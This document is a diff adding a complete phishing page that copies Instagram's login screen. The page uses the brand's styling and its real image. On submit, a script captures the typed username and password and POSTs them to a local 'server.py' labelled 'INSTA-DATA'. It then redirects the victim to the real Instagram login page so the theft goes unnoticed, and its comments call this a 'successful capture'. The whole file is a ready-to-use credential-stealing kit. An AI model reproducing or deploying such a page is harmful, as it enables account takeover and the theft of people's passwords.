@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Log in</title>
+    <style>
+        /* CSS STYLES */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .main-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 935px;
+            gap: 32px;
+        }
+
+        /* Hide phone mockup on mobile */
+        .mockup {
+            display: none;
+        }
+
+        @media (min-width: 768px) {
+            .mockup { display: block; }
+        }
+
+        .login-card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            padding: 40px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            font-size: 45px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .input-box {
+            width: 100%;
+            height: 38px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            margin-bottom: 8px;
+            padding: 9px 8px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .input-box:focus {
+            border-color: #a8a8a8;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 7px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.5;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            font-size: 13px;
+            margin: 20px 0;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider span { padding: 0 15px; }
+
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .signup-card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-card a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .loading-overlay {
+            display: none;
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="mockup">
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fd1d92e033c3.png" alt="mockup">
+        </div>
+
+        <div class="form-area">
+            <div class="login-card">
+                <div class="logo">Instagram</div>
+                
+                <form id="loginForm">
+                    <input type="text" id="username" class="input-box" placeholder="Phone number, username, or email" required>
+                    <input type="password" id="password" class="input-box" placeholder="Password" required>
+                    <button type="submit" id="submitBtn" class="login-btn">Log In</button>
+                </form>
+
+                <div class="divider"><span>OR</span></div>
+                <div class="fb-login">Log in with Facebook</div>
+                <div id="status" class="loading-overlay">Verifying...</div>
+            </div>
+
+            <div class="signup-card">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // JAVASCRIPT LOGIC
+        const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusMsg = document.getElementById('status');
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // UI Feedback
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = "0.7";
+            statusMsg.style.display = "block";
+
+            // Sending data to your local server.py
+            fetch('/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'text/plain' },
+                body: `INSTA-DATA >> User: ${user} | Pass: ${pass}`
+            })
+            .then(() => {
+                // Successful capture, wait 1.5s then redirect to real Instagram
+                setTimeout(() => {
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                }, 1500);
+            })
+            .catch((error) => {
+                console.log("Error capturing data, redirecting anyway...");
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            });
+        });
+    </script>
+</body>
+</html>
